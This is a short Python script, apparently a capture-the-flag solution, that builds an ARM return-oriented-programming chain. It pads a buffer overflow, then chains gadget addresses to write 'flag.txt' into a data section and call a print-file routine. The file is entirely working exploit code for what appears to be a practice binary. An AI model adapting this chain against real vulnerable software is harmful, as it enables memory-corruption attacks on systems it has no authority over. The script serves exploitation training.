#!/usr/bin/python3

from ropchain import *

# Gadgets / Useful addresses

PRINT_FILE              = 0x000105dc
POP_R0_R1_R3_BX_R1      = 0x000105ec
STR_R6_AT_R5_PLUS_44    = 0x000103eb
POP_CHAIN_8             = 0x00010658
DATA_SECTION            = 0x00021024

# ROP

rop = pad(36)
rop += pack4(POP_CHAIN_8)

rop += pack4(0)
rop += pack4(DATA_SECTION - 0x44)
rop += packS("flag", 4)
rop += pack4(0) * 4 + pack4(POP_R0_R1_R3_BX_R1)
rop += pack4(POP_CHAIN_8) + pack4(STR_R6_AT_R5_PLUS_44) + pack4(0)

rop += pack4(0)
rop += pack4(DATA_SECTION - 0x40)
rop += packS(".txt", 4)
rop += pack4(0) * 4 + pack4(POP_R0_R1_R3_BX_R1)
rop += pack4(POP_R0_R1_R3_BX_R1) + pack4(STR_R6_AT_R5_PLUS_44) + pack4(0)

rop += pack4(DATA_SECTION) + pack4(PRINT_FILE) + pack4(0)

echo(rop)
